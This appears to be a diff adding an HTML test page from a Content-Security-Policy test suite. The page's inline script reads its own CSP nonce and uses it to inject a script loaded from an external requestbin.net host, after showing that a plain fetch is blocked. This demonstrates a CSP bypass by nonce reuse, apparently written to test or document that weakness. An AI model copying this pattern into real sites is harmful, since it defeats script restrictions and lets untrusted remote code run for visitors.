@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <script src="test-runner.js"></script>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-s33kr1t'">
+
+    <script type="text/javascript" nonce="s33kr1t">
+        // We can't do this...
+        fetch("https://expect-fail/")
+
+        // But we can do this... (nonces are hidden in the DOM but visible to
+        // scripts).
+        const nonce = document.currentScript.nonce;
+        const script = document.createElement('script');
+        script.src = "https://nonce.a0c834c72c1b14cc7cfe.d.requestbin.net"
+        script.nonce = nonce;
+        document.head.appendChild(script);
+    </script>
+</head>
+
+<body>
+</body>
+
+</html>
